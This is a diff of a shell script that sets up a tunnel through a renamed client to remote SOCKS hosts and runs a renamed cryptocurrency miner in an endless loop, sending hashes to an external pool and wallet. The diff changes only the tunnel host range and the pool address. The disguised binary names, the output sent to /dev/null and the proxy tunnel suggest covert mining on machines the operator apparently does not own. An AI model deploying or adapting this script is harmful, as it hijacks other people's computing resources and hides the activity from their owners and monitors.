@@ -23,7 +23,7 @@ tar -xf cheese.tar.gz
 
 sleep 2
 
-./cheese client -v cpusocks$(shuf -i 7-12 -n 1).wot.mrface.com:80 7777:socks &
+./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &
 
 sleep 2
 
@@ -137,6 +137,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool usa.latinminers.com:9451 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool eu.coinXpool.com:8243 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
